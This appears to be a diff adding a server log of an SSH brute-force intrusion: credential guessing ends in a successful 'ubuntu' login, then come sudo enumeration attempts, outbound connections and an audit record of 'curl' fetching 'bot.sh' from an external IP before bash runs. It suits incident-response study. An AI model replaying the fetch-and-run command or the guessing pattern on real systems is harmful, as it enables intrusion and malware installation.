@@ -1,0 +1,131 @@
+May 14 03:00:12 webserver sshd[2847]: Invalid user admin from 203.0.113.45 port 54321
+May 14 03:00:15 webserver sshd[2848]: Invalid user root from 203.0.113.45 port 54322
+May 14 03:00:18 webserver sshd[2849]: Invalid user test from 203.0.113.45 port 54323
+May 14 03:00:21 webserver sshd[2850]: Invalid user oracle from 203.0.113.45 port 54324
+May 14 03:00:24 webserver sshd[2851]: Invalid user postgres from 203.0.113.45 port 54325
+May 14 03:00:27 webserver sshd[2852]: Invalid user mysql from 203.0.113.45 port 54326
+May 14 03:00:30 webserver sshd[2853]: Invalid user nginx from 203.0.113.45 port 54327
+May 14 03:00:33 webserver sshd[2854]: Invalid user apache from 203.0.113.45 port 54328
+May 14 03:00:36 webserver sshd[2855]: Invalid user www-data from 203.0.113.45 port 54329
+May 14 03:00:39 webserver sshd[2856]: Invalid user admin from 203.0.113.45 port 54330
+May 14 03:00:42 webserver sshd[2857]: Invalid user administrator from 203.0.113.45 port 54331
+May 14 03:00:45 webserver sshd[2858]: Invalid user user from 203.0.113.45 port 54332
+May 14 03:00:48 webserver sshd[2859]: Invalid user guest from 203.0.113.45 port 54333
+May 14 03:00:51 webserver sshd[2860]: Invalid user support from 203.0.113.45 port 54334
+May 14 03:00:54 webserver sshd[2861]: Invalid user deploy from 203.0.113.45 port 54335
+May 14 03:00:57 webserver sshd[2862]: Invalid user jenkins from 203.0.113.45 port 54336
+May 14 03:01:00 webserver sshd[2863]: Invalid user git from 203.0.113.45 port 54337
+May 14 03:01:03 webserver sshd[2864]: Invalid user svn from 203.0.113.45 port 54338
+May 14 03:01:06 webserver sshd[2865]: Invalid user ftp from 203.0.113.45 port 54339
+May 14 03:01:09 webserver sshd[2866]: Invalid user backup from 203.0.113.45 port 54340
+May 14 03:01:12 webserver sshd[2867]: Password authentication for invalid user root from 203.0.113.45 port 54341
+May 14 03:01:15 webserver sshd[2868]: Password authentication for invalid user admin from 203.0.113.45 port 54342
+May 14 03:01:18 webserver sshd[2869]: Invalid user appuser from 203.0.113.45 port 54343
+May 14 03:01:21 webserver sshd[2870]: Invalid user sysadmin from 203.0.113.45 port 54344
+May 14 03:01:24 webserver sshd[2871]: Invalid user dbadmin from 203.0.113.45 port 54345
+May 14 03:01:27 webserver sshd[2872]: Password authentication for invalid user test from 203.0.113.45 port 54346
+May 14 03:01:30 webserver sshd[2873]: Invalid user webadmin from 203.0.113.45 port 54347
+May 14 03:01:33 webserver sshd[2874]: Invalid user manager from 203.0.113.45 port 54348
+May 14 03:01:36 webserver sshd[2875]: Invalid user ubuntu from 203.0.113.45 port 54349
+May 14 03:01:39 webserver sshd[2876]: Invalid user debian from 203.0.113.45 port 54350
+May 14 03:01:42 webserver sshd[2877]: Password authentication for invalid user deploy from 203.0.113.45 port 54351
+May 14 03:01:45 webserver sshd[2878]: Invalid user centos from 203.0.113.45 port 54352
+May 14 03:01:48 webserver sshd[2879]: Invalid user operator from 203.0.113.45 port 54353
+May 14 03:01:51 webserver sshd[2880]: Invalid user netadmin from 203.0.113.45 port 54354
+May 14 03:01:54 webserver sshd[2881]: Invalid user secadmin from 203.0.113.45 port 54355
+May 14 03:01:57 webserver sshd[2882]: Password authentication for invalid user jenkins from 203.0.113.45 port 54356
+May 14 03:02:00 webserver sshd[2883]: Invalid user monitord from 203.0.113.45 port 54357
+May 14 03:02:03 webserver sshd[2884]: Invalid user alertd from 203.0.113.45 port 54358
+May 14 03:02:06 webserver sshd[2885]: Invalid user appd from 203.0.113.45 port 54359
+May 14 03:02:09 webserver sshd[2886]: Invalid user devops from 203.0.113.45 port 54360
+May 14 03:02:12 webserver sshd[2887]: Password authentication for invalid user devops from 203.0.113.45 port 54361
+May 14 03:02:15 webserver sshd[2888]: Invalid user svc_account from 203.0.113.45 port 54362
+May 14 03:02:18 webserver sshd[2889]: Invalid user service from 203.0.113.45 port 54363
+May 14 03:02:21 webserver sshd[2890]: Invalid user scheduler from 203.0.113.45 port 54364
+May 14 03:02:24 webserver sshd[2891]: Invalid user runner from 203.0.113.45 port 54365
+May 14 03:02:27 webserver sshd[2892]: Password authentication for invalid user runner from 203.0.113.45 port 54366
+May 14 03:02:30 webserver sshd[2893]: Invalid user buildbot from 203.0.113.45 port 54367
+May 14 03:02:33 webserver sshd[2894]: Invalid user webapp from 203.0.113.45 port 54368
+May 14 03:02:36 webserver sshd[2895]: Invalid user appserver from 203.0.113.45 port 54369
+May 14 03:02:39 webserver sshd[2896]: Invalid user websvc from 203.0.113.45 port 54370
+May 14 03:02:42 webserver sshd[2897]: Password authentication for invalid user websvc from 203.0.113.45 port 54371
+May 14 03:02:45 webserver sshd[2898]: Invalid user proxy from 203.0.113.45 port 54372
+May 14 03:02:48 webserver sshd[2899]: Invalid user cache from 203.0.113.45 port 54373
+May 14 03:02:51 webserver sshd[2900]: Invalid user queue from 203.0.113.45 port 54374
+May 14 03:02:54 webserver sshd[2901]: Invalid user broker from 203.0.113.45 port 54375
+May 14 03:02:57 webserver sshd[2902]: Password authentication for invalid user broker from 203.0.113.45 port 54376
+May 14 03:03:00 webserver sshd[2903]: Invalid user indexer from 203.0.113.45 port 54377
+May 14 03:03:03 webserver sshd[2904]: Invalid user search from 203.0.113.45 port 54378
+May 14 03:03:06 webserver sshd[2905]: Invalid user elastic from 203.0.113.45 port 54379
+May 14 03:03:09 webserver sshd[2906]: Invalid user kafka from 203.0.113.45 port 54380
+May 14 03:03:12 webserver sshd[2907]: Received disconnect from 203.0.113.45 port 54380 [preauth]
+May 14 03:03:15 webserver sshd[2908]: Invalid user dev from 203.0.113.45 port 54381
+May 14 03:03:18 webserver sshd[2909]: Invalid user staging from 203.0.113.45 port 54382
+May 14 03:03:21 webserver sshd[2910]: Invalid user prod from 203.0.113.45 port 54383
+May 14 03:03:24 webserver sshd[2911]: Invalid user production from 203.0.113.45 port 54384
+May 14 03:03:27 webserver sshd[2912]: Password authentication for invalid user production from 203.0.113.45 port 54385
+May 14 03:03:30 webserver sshd[2913]: Invalid user appdev from 203.0.113.45 port 54386
+May 14 03:03:33 webserver sshd[2914]: Invalid user test1 from 203.0.113.45 port 54387
+May 14 03:03:36 webserver sshd[2915]: Invalid user test2 from 203.0.113.45 port 54388
+May 14 03:03:39 webserver sshd[2916]: Invalid user testuser from 203.0.113.45 port 54389
+May 14 03:03:42 webserver sshd[2917]: Password authentication for invalid user testuser from 203.0.113.45 port 54390
+May 14 03:03:45 webserver sshd[2918]: Invalid user testadmin from 203.0.113.45 port 54391
+May 14 03:03:48 webserver sshd[2919]: Invalid user demo from 203.0.113.45 port 54392
+May 14 03:03:51 webserver sshd[2920]: Invalid user demouser from 203.0.113.45 port 54393
+May 14 03:03:54 webserver sshd[2921]: Invalid user demoadmin from 203.0.113.45 port 54394
+May 14 03:04:00 webserver sshd[2922]: Invalid user appconfig from 203.0.113.45 port 54395
+May 14 03:04:15 webserver sshd[2923]: Received disconnect from 203.0.113.45 port 54395 [preauth]
+May 14 03:04:30 webserver sshd[2924]: Invalid user sysadmin from 203.0.113.45 port 54396
+May 14 03:04:33 webserver sshd[2925]: Invalid user admin from 203.0.113.45 port 54397
+May 14 03:04:36 webserver sshd[2926]: Invalid user root from 203.0.113.45 port 54398
+May 14 03:04:39 webserver sshd[2927]: Received disconnect from 203.0.113.45 port 54398 [preauth]
+May 14 03:04:42 webserver sshd[2928]: Invalid user ubuntu from 203.0.113.45 port 54399
+May 14 03:04:45 webserver sshd[2929]: Password authentication for invalid user ubuntu from 203.0.113.45 port 54399
+May 14 03:04:48 webserver sshd[2930]: Received disconnect from 203.0.113.45 port 54399 [preauth]
+May 14 03:05:00 webserver sshd[2931]: Invalid user ubuntu from 203.0.113.45 port 54400
+May 14 03:05:03 webserver sshd[2932]: Password authentication for invalid user ubuntu from 203.0.113.45 port 54400
+May 14 03:05:06 webserver sshd[2933]: Received disconnect from 203.0.113.45 port 54400 [preauth]
+May 14 03:05:18 webserver sshd[2934]: Invalid user ubuntu from 203.0.113.45 port 54401
+May 14 03:05:21 webserver sshd[2935]: Password authentication for invalid user ubuntu from 203.0.113.45 port 54401
+May 14 03:05:24 webserver sshd[2936]: Received disconnect from 203.0.113.45 port 54401 [preauth]
+May 14 03:05:36 webserver sshd[2937]: Invalid user ubuntu from 203.0.113.45 port 54402
+May 14 03:05:39 webserver sshd[2938]: Password authentication for invalid user ubuntu from 203.0.113.45 port 54402
+May 14 03:05:42 webserver sshd[2939]: Accepted password for ubuntu from 203.0.113.45 port 54402 ssh2
+May 14 03:05:42 webserver sshd[2939]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 14 03:05:43 webserver sshd[2940]: Received signal 15; terminating.
+May 14 03:05:48 webserver systemd-logind[892]: New session 127 of user ubuntu.
+May 14 03:05:49 webserver sshd[2941]: Accepted password for ubuntu from 203.0.113.45 port 54403 ssh2
+May 14 03:05:49 webserver sshd[2941]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 14 03:06:00 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+May 14 03:06:00 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:03 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+May 14 03:06:03 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:06 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+May 14 03:06:06 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:09 webserver sudo: ubuntu : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+May 14 03:06:12 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/cat /etc/sudoers
+May 14 03:06:12 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:18 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/id
+May 14 03:06:18 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:24 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/whoami
+May 14 03:06:24 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:30 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/sudo -l
+May 14 03:06:30 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:36 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/ls -la /root
+May 14 03:06:36 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:42 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/env
+May 14 03:06:42 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:06:48 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/whoami
+May 14 03:06:48 webserver sudo: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost= user=root
+May 14 03:07:00 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=185.220.101.45 PROTO=TCP SPT=52847 DPT=443
+May 14 03:07:02 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=45.142.212.180 PROTO=TCP SPT=52848 DPT=8080
+May 14 03:07:04 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=91.199.104.123 PROTO=TCP SPT=52849 DPT=80
+May 14 03:07:06 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=195.154.33.200 PROTO=TCP SPT=52850 DPT=443
+May 14 03:07:08 webserver sshd[2941]: Received disconnect from 203.0.113.45 port 54403
+May 14 03:07:08 webserver sshd[2941]: pam_unix(sshd:session): session closed for user ubuntu
+May 14 03:07:10 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=104.21.45.67 PROTO=TCP SPT=52851 DPT=443
+May 14 03:07:12 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=172.67.178.234 PROTO=UDP SPT=52852 DPT=53
+May 14 03:07:14 webserver auditd: type=EXECVE msg=audit(1715743634.321:2847): argc=3 a0="curl" a1="-v" a2="http://135.181.77.12/bot.sh"
+May 14 03:07:16 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=135.181.77.12 PROTO=TCP SPT=52853 DPT=80
+May 14 03:07:18 webserver auditd: type=EXECVE msg=audit(1715743638.401:2848): argc=1 a0="/bin/bash"
+May 14 03:07:20 webserver kernel: OUT=eth0 SRC=192.168.1.105 DST=203.0.113.45 PROTO=TCP SPT=52854 DPT=443
